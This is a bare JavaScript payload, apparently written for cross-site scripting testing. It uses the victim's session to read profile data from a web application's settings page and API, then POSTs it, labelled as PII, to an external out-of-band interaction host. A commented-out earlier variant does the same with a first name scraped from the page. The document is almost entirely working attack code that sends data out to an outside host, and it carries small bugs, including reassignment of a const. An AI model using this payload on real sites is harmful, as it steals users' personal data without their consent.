//xhr=new XMLHttpRequest();
//xhr.open('GET','/ProfileSettings#general');
//xhr.withCredentials=true;
//xhr.onreadystatechange=()=>{if(xhr.readyState==4){dom=new DOMParser().parseFromString(xhr.response,'text/html');var firstName = dom.querySelector('[data-bind="text: firstName"]').textContent;xhr=new XMLHttpRequest();xhr.open("POST","https://kypdqokutkzjkenfltayept3ry0mphyy4.oast.fun");xhr.send(`firstName=${firstName}`);}};
//xhr.send();

const xhr = new XMLHttpRequest();
xhr.open("GET", "/api/applicationData/forProfileSettings", true); 

xhr.onload = function() {
  if (xhr.status === 200) {
    const response = JSON.parse(xhr.responseText);

    const firstName = response.generalInfo?.contactInfo?.name?.firstName;

    if (firstName && firstName.trim() !== "") {
    xhr=new XMLHttpRequest();
    xhr.open("POST","https://kypdqokutkzjkenfltayept3ry0mphyy4.oast.fun");
    xhr.send(`PII=${response}`);
    } else {
      console.log("First Name is missing or empty");
    }
  } else {
    console.log(`Error: ${xhr.status}`);
  }
};

xhr.onerror = function() {
  console.log("Request failed");
};

xhr.send();

